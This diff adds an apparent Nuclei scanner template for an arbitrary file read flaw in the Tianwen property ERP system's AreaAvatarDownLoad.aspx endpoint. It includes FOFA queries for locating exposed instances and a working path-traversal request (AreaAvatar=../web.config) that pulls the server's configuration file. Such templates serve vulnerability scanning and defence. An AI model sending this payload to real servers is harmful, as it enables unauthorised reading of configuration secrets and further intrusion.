@@ -1,0 +1,37 @@
+id: tianwenEPR-AreaAvatarDownLoad-File-reading
+
+info:
+  name: "天问物业 ERP 系统 AreaAvatarDownLoad.aspx 接口任意文件读取"
+  author: Unknown
+  severity: high
+  description: |-
+    fofa: body="天问物业ERP系统" || body="国家版权局软著登字第1205328号" || body="/HM/M_Main/frame/sso.aspx"
+    天问物业ERP系统 AreaAvatarDownLoad.aspx 接口存在文件读取权限控制缺陷，攻击者可通过构造特定路径参数绕过访问控制机制，实现对服务器任意文件的非授权访问。该漏洞可能导致系统配置文件、敏感业务数据等机密信息泄露，进而为后续攻击提供突破口。
+  reference:
+  - https://mp.weixin.qq.com/s?__biz=MzkzMTcwMTg1Mg==&mid=2247485268&idx=1&sn=2bc5152edc4b369d67e4412a845ca784&chksm=c267b267f5103b71d8624c760c6dc5d032548c525067a5908350ab895c626e812fae3d3edcf8&token=1439003696&lang=zh_CN#rd
+  tags: 天问物业ERP系统
+
+
+
+http:
+- raw:
+  - |
+    GET /HM/M_Main/InformationManage/AreaAvatarDownLoad.aspx?AreaAvatar=../web.config HTTP/1.1
+    Host: {{Hostname}}
+
+  matchers-condition: and
+  matchers:
+  - type: word
+    part: body
+    words:
+    - '<configuration>'
+    - '</configuration>'
+    condition: and
+  - type: status
+    status:
+    - 200
+
+
+
+
+
